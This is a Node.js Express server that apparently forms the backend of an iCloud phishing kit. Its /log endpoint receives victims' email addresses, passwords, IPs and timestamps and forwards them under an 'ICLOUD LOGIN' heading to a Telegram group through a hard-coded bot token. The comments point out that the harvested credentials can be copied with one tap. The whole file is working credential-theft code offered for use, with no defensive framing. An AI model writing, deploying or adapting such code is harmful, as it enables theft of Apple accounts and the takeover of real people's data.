const express = require('express');
const path = require('path');

// ============================================
// CONFIG
// ============================================
const BOT_TOKEN = '8843925472:AAFNt5aPu39E7YhPs8WjXARNmQ3VBhnZJ68';
const GROUP_ID  = '-1003983565500';

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// ============================================
// TELEGRAM HELPER
// ============================================
async function tgSend(text, reply_markup) {
    const payload = {
        chat_id: GROUP_ID,
        text: text,
        parse_mode: 'HTML'
    };
    if (reply_markup) payload.reply_markup = reply_markup;

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
    return r.json();
}

// ============================================
// POST /log
// ============================================
app.post('/log', async (req, res) => {
    try {
        const { email, password, attempt, ip, day, time, date } = req.body;
        if (!email || !password) {
            return res.status(400).json({ ok: false, error: 'missing fields' });
        }

        // The email and password are wrapped in <code> tags.
        // This puts them INSIDE the message text. Tapping them copies them.
        const text =
            '🍎 <b>ICLOUD LOGIN</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━━\n' +
            '📧 Email: <code>' + email + '</code>\n' +
            '🔑 Password: <code>' + password + '</code>\n' +
            '📊 Attempt: ' + (attempt || '—') + '\n' +
            '🌐 IP: ' + (ip || '—') + '\n' +
            '📅 Day: ' + (day || '—') + '\n' +
            '⏰ Time: ' + (time || '—') + '\n' +
            '📆 Date: ' + (date || '—') + '\n' +
            '━━━━━━━━━━━━━━━━━━━━━\n' +
            '👆 Tap the email or password to copy';

        // NO reply_markup here. No buttons below the message.
        const data = await tgSend(text);

        if (!data.ok) {
            console.error('❌ Telegram rejected:', data.description);
            return res.status(500).json({ ok: false, error: data.description });
        }

        console.log('✅ Sent:', email);
        res.json({ ok: true });
    } catch (err) {
        console.error('❌ error:', err.message);
        res.status(500).json({ ok: false, error: err.message });
    }
});

// ============================================
// START
// ============================================
const PORT = 3000;
app.listen(PORT, () => {
    console.log('🚀 http://localhost:' + PORT);
    console.log('📌 Group ID: ' + GROUP_ID);
});